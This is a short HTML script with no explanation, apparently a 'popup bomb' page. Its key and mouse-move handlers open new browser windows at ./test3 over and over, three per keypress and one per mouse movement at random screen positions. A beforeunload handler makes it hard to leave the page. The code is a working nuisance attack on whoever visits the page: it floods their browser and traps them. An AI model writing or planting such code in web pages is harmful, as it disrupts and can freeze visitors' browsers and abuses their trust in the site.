<script>
window.onkeydown = function (event) {
  window.open("./test3")
  window.open("./test3")
  window.open("./test3")
}

window.addEventListener('beforeunload', function (e) {
    e.preventDefault()
    e.returnValue = ""

});

window.onmousemove = function (e) {
  window.open("./test3", "_blank", "toolbar=yes,top="+String(Math.random()*1000)+",left="+String(Math.random()*1000)+",width=400,height=200");

}
window.onmouseclick = function (e) {
  window.open("./test3", "_blank", "toolbar=yes,top="+String(Math.random()*1000)+",left="+String(Math.random()*1000)+",width=400,height=200");
}
</script>
